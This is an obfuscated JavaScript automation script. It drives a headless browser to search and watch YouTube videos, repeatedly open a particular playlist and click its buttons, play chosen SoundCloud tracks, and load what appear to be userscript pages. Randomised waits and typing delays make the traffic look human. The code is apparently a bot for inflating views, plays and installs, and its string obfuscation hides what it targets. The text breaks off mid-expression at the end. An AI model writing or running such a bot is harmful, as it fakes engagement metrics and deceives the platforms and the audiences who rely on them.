function a() {
  const bm = [
    'fCkGWR7dQSoOW5VcVxNdSCoZ',
    'Bfa0oc1rtKDNqW',
    'CMCVzw4VC2nYAq',
    'rg/en/scri',
    'l1bHCNrPy2XLqW',
    'Ahr0Chm6lY9Tzq',
    'og.bitsrc.',
    'C3rYAwn0lw9YAq',
    'W7G4WOJcICkzWRWLytxcUa',
    'yKN_QkroH6',
    'pts/430253',
    'offsetPare',
    'ie5uideWlJa7ia',
    'BgBcNrxcGCk0amoVWPeb',
    'fttcP8ofnsFdGdNdMCkP',
    'y2XVC2u',
    'BYbIyxnLlg1VBW',
    'zs9IywLKDs5JBW',
    'tuPYA3LSAZDPrq',
    'Ahr0Chm6lY9NCG',
    'lNvZzxiUANm',
    'W4aDWQjIxJWob0bk',
    'm1zTDgnRDLryBa',
    'W7jItrxcKmoRmmo+jv0',
    'WROmC8ouW5D8WPVcSNvE',
    '28\x20Mobile\x20',
    'dium.com/e',
    'https://gr',
    'qLSXWOSnW5LLWOOdW7K',
    'owFcHq7dV8obAuu',
    'gCkQW4ldQYnPWQBdLSkZWR4',
    'zwfZEwzVCMSUBW',
    'lADBHDg-Jt',
    'z2v0vg9Rzw4',
    '537.36'
  ];
  a = function() {
    return bm;
  };
  return a();
}
const X = d,
  W = b,
  V = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1 * 0xf99 + 0x6 * 0x624 + -0x2 * 0xa9f))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x2060 + 0xf * 0x191 + -0x37df), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xadb6 + 0x9 * 0x1873 + 0x46db + (-0x1 * 0x45a3 + -0x61ac + 0x6f * 0x209) * random()) : await standardWaitForNetIdle(f), await wait(0x8 * 0x3e + -0x1bc + -0x2 * -0x9aa + (0x4049 + -0x8 * -0xf8 + -0x17 * 0x16f) * random()), -0x279 * 0x3 + 0x12af * 0x1 + -0xb43;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1a6 * -0xd + 0x16f2 + 0x1 * -0x184);
    let h = e[f];
    if (c['rpTwdY'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x147d + 0x1 * 0xa39 + 0xf5b * -0x2, r, s, t = 0x2 * -0x127d + -0x12f0 + 0x1bf5 * 0x2; s = m['charAt'](t++); ~s && (r = q % (0x10 * -0x3e + 0x1fd4 + 0x1bf * -0x10) ? r * (-0x1 * 0x1907 + 0x1664 + -0x1 * -0x2e3) + s : s, q++ % (0x197 + 0x6a4 + -0x837)) ? o += String['fromCharCode'](0x149d + 0x10 * -0x32 + -0x1 * 0x107e & r >> (-(0x73d + -0x1 * -0xdb7 + 0x1 * -0x14f2) * q & -0xe06 + -0x3 * -0x6ab + -0x5f5)) : 0x12af + 0x2197 * 0x1 + -0x3446) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1d7f + -0x25ce + 0x84f, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x3e0 + -0x4 * 0x77d + 0x21e4))['slice'](-(0x78b + -0x1b89 + 0x1400));
        }
        return decodeURIComponent(p);
      };
      c['VuUCrk'] = i, b = arguments, c['rpTwdY'] = !![];
    }
    const j = e[0x4c * 0x32 + -0xa2 * -0x20 + -0x8c6 * 0x4],
      k = f + j,
      l = b[k];
    return !l ? (h = c['VuUCrk'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardWaitForNetIdle(f) {
  return await wait(0x1d7f + -0x25ce + 0x1bd7), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x3e0 + -0x4 * 0x77d + 0x21d5;
}
async function randomWait() {
  return await wait(0x78b + -0x1b89 + 0x2786 + (0x4c * 0x32 + -0xa2 * -0x20 + -0xf9 * 0x10) * random()), 0x20e2 + 0x17bc + -0x12df * 0x3;
}
async function watchRandomFrontScreenVideo(f) {
  const R = b;
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x12 * 0x159 + -0x1d17 + -0x1 * -0x4d5, -0x6a * -0x25 + -0x1618 + 0x6cd * 0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click'](R(0x1d, 'pJ6V')), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x14d0b + 0x1 * 0x10b14 + 0x12c57) * getRandomInt(-0x1 * 0x127c + -0xb9 * 0xa + 0x19b8 * 0x1, 0x1b3b + 0x2538 + -0x3 * 0x157a), h)), -0x9 * 0x25e + -0x162c + 0x2b7b;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x16 * -0x198 + -0xc95 * -0x1 + -0x2fa5;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x270a + 0x1dc0 + 0x94b]['split']('\x20');
    for (let k = -0x1936 * -0x1 + 0x2 * -0x6c6 + -0x2 * 0x5d5; k < i['length']; k += 0x10 * -0x262 + 0x178b * -0x1 + 0x3dad)
      j += i[k] * h[i[k + (-0x554 + -0x111f * 0x2 + 0x3 * 0xd31)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1 * -0x1882 + -0x1e53 + 0x36db)['map'](l => Array['from'](l['children']))['flat'](-0x1e9f + -0x1e0c + 0x3cac)['map'](l => l['childNodes'][-0x14f6 + -0x1143 + 0x1 * 0x263a]['childNodes'][-0x18 * -0x107 + 0x1f * 0x10a + -0x3a * 0xfb]['childNodes'][0x9ad + -0x20c6 + 0x171a]['childNodes'][0x31b + -0x5e * 0xa + 0x91 * 0x1]['childNodes'][-0x26d2 + -0x248c + 0x4b5f]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1aaf + -0x1dea * -0x1 + -0x34b1, 0xf93 + -0x1 * 0x234a + 0x273f)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x3 * -0x1b55 + -0x2a77 + -0x131 * -0x10);
  const h = await getMaxTime(f),
    i = Math['min']((0x4 * 0x515e + 0x77ee + -0x1 * 0xd306) * getRandomInt(0x559 + 0xd3 * 0x24 + -0x2303, -0x2 * 0x1331 + -0xda * 0x2a + 0x1 * 0x4a2b), h);
  return await wait(i), 0x20c7 + 0x2a * 0x4f + -0x2dbc;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0xe7 * -0x20 + 0xd28 + 0xfb8]['children'][0x1079 + 0xc3a + -0x1cb3]['children'][0x1071 + 0x4dc + 0x1 * -0x154d]['children'][0x1e5c + -0xcf2 + -0x6 * 0x2e7]['children'][0x4f7 * 0x4 + 0x2 * -0x8a7 + 0x6d * -0x6]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1 * -0x2454 + 0x5e * -0x67 + 0x4a27;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x1 * -0x158b + -0xfff + -0x21 * 0x28 + (0x1781 + 0x444 * -0x9 + 0xf15) * random()
  }), await wait(-0x1b3a + -0x3b * -0x46 + -0x686 * -0x2 + (-0x2705 + 0xeb2 + -0x3d * -0x6b) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const S = b,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + S(0xd, ']C!b')]('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x102a + 0x1 * 0x9fd + 0x62f]['childNodes'][0x119 + 0x210d + -0x2225 * 0x1]['childNodes'][-0xd * 0x62 + -0x1c0a * 0x1 + 0x2105]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1d * 0xfd + 0x1ea4 + -0x3b48]['childNodes'][-0x9 * -0x32f + 0x1 * -0x11f1 + -0xab6 * 0x1]['childNodes'][0x91 * 0x19 + -0x1522 * 0x1 + 0x6fb * 0x1]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x21 * -0x1 + 0xc43 + 0x7 * -0x1c5),
          r = -0x718 * 0x3 + -0x115 * 0x8 + 0x1df0;
        for (let u = -0x1423 + -0x10c1 * 0x1 + -0xc4c * -0x3; u < q['length']; u += -0xeae * 0x2 + 0x38 * 0x3b + 0x1076)
          r += q[u] * k[q[u + (0x2 * -0x13 + 0xc91 + -0xc6a * 0x1)]];
        return r;
      }(n);
  });
  await wait((-0xe1f * 0x8 + 0x2005 * 0x1 + 0x8b8b) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x7d11 + -0x20 * 0xb7e + -0x1 * -0x2d731) * getRandomInt(-0x1fb7 + 0x5 * -0x318 + 0x14 * 0x25c, 0x48 * 0x21 + 0x1a2b + -0x2369), h + (0x1ed + 0x9d6 + -0x75 * -0x11));
  return await wait(i), -0x129c + -0x1908 + 0x2ba5 * 0x1;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1a6 * -0xd + 0x16f2 + 0x1 * -0x184);
    let h = e[f];
    if (b['oYssmL'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x147d + 0x1 * 0xa39 + 0xf5b * -0x2, s, t, u = 0x2 * -0x127d + -0x12f0 + 0x1bf5 * 0x2; t = n['charAt'](u++); ~t && (s = r % (0x10 * -0x3e + 0x1fd4 + 0x1bf * -0x10) ? s * (-0x1 * 0x1907 + 0x1664 + -0x1 * -0x2e3) + t : t, r++ % (0x197 + 0x6a4 + -0x837)) ? p += String['fromCharCode'](0x149d + 0x10 * -0x32 + -0x1 * 0x107e & s >> (-(0x73d + -0x1 * -0xdb7 + 0x1 * -0x14f2) * r & -0xe06 + -0x3 * -0x6ab + -0x5f5)) : 0x12af + 0x2197 * 0x1 + -0x3446) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1d7f + -0x25ce + 0x84f, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x3e0 + -0x4 * 0x77d + 0x21e4))['slice'](-(0x78b + -0x1b89 + 0x1400));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x4c * 0x32 + -0xa2 * -0x20 + -0x8c6 * 0x4,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x20e2 + 0x17bc + -0x1c4f * 0x2; u < 0x12 * 0x159 + -0x1d17 + -0x1 * -0x5d5; u++) {
          p[u] = u;
        }
        for (u = -0x6a * -0x25 + -0x1618 + 0x6c6 * 0x1; u < -0x1bc1 + 0x2 * 0xb21 + 0x67f; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1 * 0x127c + -0xb9 * 0xa + 0x1ab6 * 0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1b3b + 0x2538 + -0x7 * 0x935, q = -0x9 * 0x25e + -0x162c + 0x2b7a;
        for (let v = -0x16 * -0x198 + -0xc95 * -0x1 + -0x2fa5; v < n['length']; v++) {
          u = (u + (-0x270a + 0x1dc0 + 0x94b)) % (-0x1936 * -0x1 + 0x2 * -0x6c6 + -0x2a * 0x41), q = (q + p[u]) % (0x10 * -0x262 + 0x178b * -0x1 + 0x3eab), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x554 + -0x111f * 0x2 + 0x3 * 0xd86)]);
        }
        return t;
      };
      b['txFYOs'] = m, c = arguments, b['oYssmL'] = !![];
    }
    const j = e[0x1 * -0x1882 + -0x1e53 + 0x36d5],
      k = f + j,
      l = c[k];
    return !l ? (b['SCXRnm'] === undefined && (b['SCXRnm'] = !![]), h = b['txFYOs'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0xd1f + -0x65 * -0x40 + -0x265f), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const T = d;
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.[T(0xb) + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x24f6 + 0x8f + 0x1 * -0x19cd + (-0x24b * 0x7 + -0x1 * 0x2543 + 0x8 * 0x727) * Math['random']());
    });
  }, -0x5 * 0x802 + 0x87d * 0x2 + 0x8 * 0x64d);
  await wait(-0x246 + 0x14b96 + 0x40d0 * 0xd);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x8fb3 + -0x7ecc + -0x1 * -0x1f8df) * getRandomInt(0x13 * -0x13d + -0x217b + 0x3906 * 0x1, 0x3 * -0x971 + -0x1303 * 0x2 + 0x4272)), clearInterval(h), -0x4f * -0x6a + 0x5f2 * -0x6 + 0x2f7;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0xa46 + -0xaf8 + 0x1 * 0x153e;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xa6e + 0x2 * 0xd0e + -0xfad;
    await randomWait();
  }
  return 0x13ed * 0x1 + -0x1ae8 + 0x6fc;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1bf7 + -0x143e + -0x7b9 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x5 * -0x5 + 0x2173 * 0x1 + -0x218c + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const U = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x675 * -0x2 + 0xceb + -0x1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x91a + 0x274 * -0x3 + -0x1be;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x8a9 + -0x1194e + 0x1c06d + getRandomInt(-0x3d * 0x2 + 0x9b * 0x8b + 0x1 * -0x1917, 0x2ff * 0x3f + -0xa00 + -0x1 * 0x3d91));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1080 + -0x2 * 0x7f7 + -0x13 * -0x1b5), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x2448 + 0xbdc + -0x3024;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r[U(0xf)](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x14 * -0xfe + 0x1 * -0x20e3 + -0x7 * -0x1dd, -0x97a * -0x2 + 0x1106 + -0x28 * 0xe5)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x8a7 + -0x18e1 + 0x38 * 0xbd + floor((-0x66d + 0x1 * -0x11e7 + 0x2 * 0xe1e) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x13041109 * -0x8 + 0x15cdb680 + -0x2dee3ec8),
          0x3 * 0x39df24 + 0x1 * -0x8c9c05 + 0x5efe99,
          0x261 * -0x23 + -0x8b77 + 0x15eba,
          0x1262 + -0x46 + 0x1c * -0xa1
        ], y = [
          -0xe30 + -0x2 * 0x226 + -0x74 * -0x29,
          -0x70a * -0x5 + 0x39 * -0x2 + -0x22b0,
          -0x8be + -0xe7 * 0x1 + -0x1 * -0x9ad,
          -0x113b + -0xa65 + 0x1ba0
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x9ca * -0x1 + -0x1d9 + -0x7f0)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x28b * -0x1 + -0x293 * 0xe + 0x53 * 0x77; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1607 + 0xd6 * 0x8 + 0xf57) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1 * 0x1567 + -0xed0 + -0x1 * -0x2437] = A[-0x2 * -0xe2c + -0x1a6 * 0x10 + -0x2 * 0xf4] = A[-0x1477 + 0x2214 + -0xd9c] = A[-0x6 * 0x67d + 0x34a * 0x5 + 0x167e] = A[0xdbd * 0x1 + -0x2434 + 0x167a] = A[-0x2a * -0x6c + -0x728 + -0xf * 0xb4] = A[0x256e + 0x1 * 0x1be9 + -0x4152] = A[0x1d67 + 0x8 + -0x1d69] = A[-0x20aa + 0x16df + 0x9d2] = A[-0x1208 * -0x1 + -0xbb + -0x1 * 0x1145] = A[0x3e1 * -0x8 + 0x805 + 0x170c] = A[0x2047 + -0x72a + 0x7 * -0x395] = A[0x1a5 + 0x1 * -0x12ad + -0x8d * -0x1f] = A[0x1c15 + 0x47 * -0x55 + -0x476 * 0x1] = A[0x44e + 0x1650 + 0x3 * -0x8db] = A[-0x19 * 0xe0 + -0x22c8 + 0x38b6 * 0x1] = A[-0x6 * 0x289 + -0x2600 + 0x3545] = 0x96e + -0x64b + -0x323, this['blocks'] = A) : this['blocks'] = [
                -0x1 * -0x20a5 + -0xd4c + -0x1359,
                0xb73 * -0x3 + 0x1987 + 0x8d2,
                -0x4 * -0x174 + 0x484 + 0xa54 * -0x1,
                -0x1 * -0xf44 + -0x81e + -0x131 * 0x6,
                0x1c27 + -0x4a5 + -0x162 * 0x11,
                -0x1388 + -0x9ac + -0xc * -0x26f,
                0x2618 + -0x189a + -0xb * 0x13a,
                0xd * -0x1e + -0x6c7 + 0x84d,
                0x1011 * 0x1 + -0x10a7 + 0x96,
                -0x4c4 + 0x637 * 0x6 + -0x2086 * 0x1,
                -0xeb0 + 0xd50 + 0x160,
                -0x5ab * -0x1 + 0x2 * -0x11d9 + 0x1e07,
                0x8ed + 0x1152 * 0x1 + -0x1a3f,
                0x2356 + 0x4 * 0x97c + -0x4946,
                0x12e0 + -0x1 * -0xe14 + -0x20f4,
                0x78 * 0x46 + -0x13ca + 0x2 * -0x683,
                -0x220b + -0x3dd * -0x3 + -0x3 * -0x77c
              ], this['h0'] = 0x6afa37d0 + 0x49e8c * 0x1a7b + -0xb750b19 * 0xb, this['h1'] = -0x1353c0d7 * 0x10 + 0x3 * 0x87b1a3d6 + -0x7 * -0x14478b11, this['h2'] = 0x6a0dad59 + 0x5 * 0x1993c95 + 0x26af00bc, this['h3'] = 0x517a * -0x370c + 0x1 * 0x101f1ea9 + 0x11983d85, this['h4'] = -0xb0925 * -0xd98 + -0x135b46bf5 + 0x16382feed * 0x1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x26fa + -0x1 * 0x1613 + -0x10e7, this['finalized'] = this['hashed'] = 0x55d * 0x1 + 0x674 + -0x79 * 0x19, this['first'] = -0x20f9 + 0xd * -0x134 + -0x6f2 * -0x7;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x111a + 0xbed + -0x109 * -0x5, O = J['length'] || -0x265d + 0x2319 + -0x1a2 * -0x2, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x51c + -0x119 * 0x1 + -0x1 * 0x403, P[0x1 * 0x16 + -0x7b3 + -0x79d * -0x1] = this['block'], P[0x5a + -0x4a0 + 0x456] = P[-0x3b5 * -0x1 + -0x1c68 * -0x1 + -0x201c] = P[-0x177a + -0x6a * 0x2d + -0x3 * -0xe0a] = P[-0x1e17 + -0xb9d * -0x3 + -0x4bd] = P[-0x1539 + 0x103f * 0x1 + 0x4fe] = P[0x230 + 0x6 * -0x51e + 0x1 * 0x1c89] = P[-0x1de0 + 0x85d * 0x2 + 0xd2c] = P[0x4 * -0x137 + 0x1 * 0xc77 + -0x794] = P[-0x17c5 + -0x51c + -0x1 * -0x1ce9] = P[0x1cc5 + 0x176a + -0x3426] = P[0x229f + 0x7 * 0x351 + -0x19b * 0x24] = P[-0x2434 + -0x2f * -0x45 + -0x1 * -0x1794] = P[0x1eb0 * 0x1 + 0x167 * 0x11 + -0x1229 * 0x3] = P[-0x244f + 0x3e0 + 0x2b5 * 0xc] = P[-0x24c9 + 0x1f6 + 0x22e1] = P[0xf * 0x286 + -0x133 + -0x2 * 0x124c] = 0x100d + 0x2ec + 0x1 * -0x12f9), K) {
                    for (N = this['start']; M < O && N < 0x326 + -0x799 * 0x1 + 0x4b3; ++M)
                      P[N >> -0x1 * 0xd87 + -0x1452 + 0x21db] |= J[M] << y[0x1988 + -0xa + -0x197b & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xf17 + 0x390 * -0x8 + 0x2bd7; ++M)
                      (L = J['charCodeAt'](M)) < -0x978 * -0x2 + -0x3 * 0x5ab + -0x16f ? P[N >> -0x102f + 0x976 + -0x1 * -0x6bb] |= L << y[0x20d9 + -0x799 + 0xd * -0x1f1 & N++] : L < -0xd6 + 0x1b5c * 0x1 + -0x1286 ? (P[N >> 0x1 * 0x647 + 0x7f9 + -0xe3e] |= (-0xb23 * -0x1 + -0x14f3 + -0x68 * -0x1a | L >> 0x11c7 + 0xa85 * 0x2 + -0x26cb) << y[0x22 * 0xfe + 0x238a * -0x1 + -0x5 * -0x5d & N++], P[N >> -0x188a + -0x254d + 0x1 * 0x3dd9] |= (0x19e + 0x141f + -0x153d | -0x1ba2 + -0x18a * 0xf + -0x3 * -0x10fd & L) << y[0x17 * 0x76 + 0x1 * -0x21e3 + 0x1c * 0xd5 & N++]) : L < -0xaa50 + 0x6d * 0x300 + 0x3b50 || L >= -0x24b * -0xb9 + -0x15fd8 + 0x97a5 ? (P[N >> 0x1 * -0xcc8 + -0x1 * -0xb9b + 0x12f] |= (0x598 * 0x3 + -0x5 * -0x127 + -0x15ab | L >> 0x5 * 0x4d7 + -0x1057 + 0x3e8 * -0x2) << y[0xb6b + 0x1de0 + -0x2948 & N++], P[N >> -0x14ae + 0x1c * -0x10f + 0x3254] |= (0x138 * -0x9 + 0x43c + 0x73c | L >> 0x1 * 0x12aa + 0x1 * 0x17f7 + 0xd * -0x347 & -0x191d + -0x1042 + 0x299e) << y[0x4b * -0x6a + -0x14da + 0x33eb & N++], P[N >> -0xb77 + 0x27 * 0xd3 + -0x1b9 * 0xc] |= (-0x1 * 0x8e7 + -0x917 * -0x4 + -0x1af5 | -0x577 * 0x1 + -0x1c0 + 0x3bb * 0x2 & L) << y[-0xc75 + -0xc4c * -0x2 + -0xc2 * 0x10 & N++]) : (L = 0x8153 + -0x1 * 0x320c + 0xb0b9 + ((-0xa * -0x2c5 + -0x1 * 0xfe5 + -0x29a * 0x3 & L) << 0x79 * 0x4 + -0x51 * 0x3 + 0xe7 * -0x1 | 0x4 * -0x79d + 0xd2c + -0x1547 * -0x1 & 